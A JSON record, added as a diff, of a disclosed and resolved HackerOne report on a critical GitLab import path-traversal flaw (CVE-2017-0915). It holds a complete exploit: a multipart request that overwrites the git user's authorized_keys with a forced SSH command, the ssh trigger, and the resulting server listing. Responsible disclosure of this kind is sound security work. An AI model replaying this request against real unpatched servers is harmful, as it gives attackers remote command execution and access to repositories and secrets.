@@ -1,0 +1,135 @@
+{
+  "id": 298873,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTg4NzM=",
+  "url": "https://hackerone.com/reports/298873",
+  "title": "Command injection by overwriting authorized_keys file through GitLab import",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-17T03:11:21.852Z",
+  "submitted_at": "2017-12-17T03:11:21.852Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-0915"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-04-27T02:20:49.927Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-04-25T23:41:20.996Z",
+  "team_member_agreed_on_going_public_at": "2018-04-27T02:20:49.842Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The `Projects::GitlabProjectsImportService` contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary command execution vulnerability by overwriting the `authorized_keys` file. To reproduce, sign in to a GitLab instance that has GitLab import enabled. This is enabled by default, so I'd assume that this vulnerability applies to most GitLab instances. I've installed my GitLab instance through Omnibus.\n\nNext up, intercept your network traffic and upload a GitLab import file. Observe the following request being made to the server:\n\n**Request**\n```\nPOST /import/gitlab_project HTTP/1.1\nHost: gitlab-instance\n...\n\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"path\"\ntest\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"namespace_id\"\n\n1\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"file\"; filename=\"2017-12-17_02-20-093_root_test_export.tar.gz\"\nContent-Type: application/x-gzip\n\n<file data>\n```\n\nNow take a closer look at the code that is being executed when this endpoint is hit:\n\n**app/services/projects/gitlab_project_import_service.rb**\n```ruby\n# This service is an adapter used to for the GitLab Import feature, and\n# creating a project from a template.\n# The latter will under the hood just import an archive supplied by GitLab.\nmodule Projects\n  class GitlabProjectsImportService\n    # ...\n\n    def execute\n      FileUtils.mkdir_p(File.dirname(import_upload_path))\n      FileUtils.copy_entry(file.path, import_upload_path)\n\n      Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id],\n                                               current_user,\n                                               import_upload_path,\n                                               params[:path]).execute\n    end\n\n    # ...\n\n    def tmp_filename\n      \"#{SecureRandom.hex}_#{params[:path]}\"\n    end\n  end\nend\n```\n\nThe `import_upload_path` will take the unsanitized `params[:path]` and append it to the GitLab uploads directory. This means that directories can be traversed in the `path` parameter. Another observation is that the file contents of the `file` aren't verified. This means that it may contain any data at that point.\n\nMy first though was to abuse this vulnerability to exploit a second-order remote code execution by writing an ERB template to the Rails views directory. However, that didn't work because of the file permissions of the GitLab Rails directory. I started looking for other files. I noticed that the uploads directory was writable for the `git` user. I took a closer look at the `/var/opt/gitlab/` directory and noticed the `.ssh/authorized_keys` directory. This file was writable for the `git` user, and thus, could be overwritten. This file can specify a command when an SSH connection is made. Now, going back to the original HTTP request, here's the updated request to overwrite the file:\n\n```\nPOST /import/gitlab_project HTTP/1.1\nHost: gitlab-instance\n...\n\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"path\"\n\nnew-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"namespace_id\"\n\n1\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"file\"; filename=\"2017-12-17_02-20-093_root_test_export.tar.gz\"\nContent-Type: application/x-gzip\n\ncommand=\"ls -lash\",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN--\n```\n\nIn the request, replace my public SSH key with your own and replace `ls -lash` with whatever command you want to execute. When the request is sent to the server, a 302 Found will be returned. This is caused by a validation error that is returned because the project name contains invalid characters. Because the files aren't cleaned up, our exploit persists.\n\n**Response**\n```\nHTTP/1.1 302 Found\nServer: nginx\n...\nLocation: http:/gitlab-instance/import/gitlab_project/new?namespace_id=1&path=new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n...\n```\n\nNow, to execute the command, run `ssh git@gitlab-instance`:\n\n```\n$ ssh git@gitlab-instance\nPTY allocation request failed on channel 0\ntotal 84K\n4.0K drwxr-xr-x 18 root              root       4.0K Dec 15 04:33 .\n4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:32 ..\n4.0K drwx------  2 git               root       4.0K Dec 15 04:32 backups\n4.0K -rw-------  1 root              root         38 Dec 15 04:33 bootstrapped\n4.0K drwx------  2 git               root       4.0K Dec 17 02:28 gitaly\n4.0K -rw-r--r--  1 git               git         292 Dec 15 04:32 .gitconfig\n4.0K drwx------  3 git               root       4.0K Dec 15 04:32 git-data\n4.0K drwxr-xr-x  3 git               root       4.0K Dec 15 04:32 gitlab-ci\n4.0K drwxr-xr-x  2 git               root       4.0K Dec 15 04:33 gitlab-monitor\n4.0K drwxr-xr-x  9 git               root       4.0K Dec 15 04:33 gitlab-rails\n4.0K drwx------  2 git               root       4.0K Dec 15 04:32 gitlab-shell\n4.0K drwxr-x---  2 git               gitlab-www 4.0K Dec 17 02:28 gitlab-workhorse\n4.0K drwx------  3 root              root       4.0K Dec 17 02:38 logrotate\n4.0K drwxr-x---  9 root              gitlab-www 4.0K Dec 17 02:28 nginx\n4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:33 node-exporter\n4.0K drwx------  2 gitlab-psql       root       4.0K Dec 15 04:34 postgres-exporter\n4.0K drwxr-xr-x  3 gitlab-psql       root       4.0K Dec 17 02:28 postgresql\n4.0K drwxr-x---  3 gitlab-prometheus root       4.0K Dec 15 04:33 prometheus\n4.0K drwxr-x---  2 gitlab-redis      git        4.0K Dec 17 02:43 redis\n4.0K drwx------  2 git               git        4.0K Dec 17 02:44 .ssh\n4.0K -rw-r--r--  1 root              root         40 Dec 15 04:32 trusted-certs-directory-hash\n```\n\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\n\n## Impact\n\nAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-05-25T23:41:21.058Z",
+  "allow_singular_disclosure_after": -251048594.48427546,
+  "singular_disclosure_allowed": true,
+  "vote_count": 50,
+  "voters": [
+    "irvinlim",
+    "m4khn0",
+    "jokebookservice1",
+    "sp1d3rs",
+    "ramsexy",
+    "0xacb",
+    "europa",
+    "bull",
+    "muon4",
+    "kapytein",
+    "and 40 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
